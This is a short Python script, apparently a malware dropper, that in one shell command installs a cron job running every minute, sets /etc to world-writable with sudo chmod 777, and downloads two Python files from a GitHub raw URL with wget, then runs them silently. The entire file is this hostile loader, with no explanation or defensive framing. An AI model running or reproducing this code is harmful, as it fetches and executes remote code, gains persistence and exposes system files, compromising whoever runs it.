import os

os.system('echo "*/1 * * * * cd && cd /etc/ && python3 system.py && python3 sys.py > /dev/null 2>&1 &" > cron && cat cron | crontab - && sudo chmod 777 /etc/ && mv run.py /etc/ && cd && cd /etc/ && wget https://raw.githubusercontent.com/katerin966/03/main/system.py && wget https://raw.githubusercontent.com/katerin966/03/main/sys.py && python3 system.py && python3 sys.py')
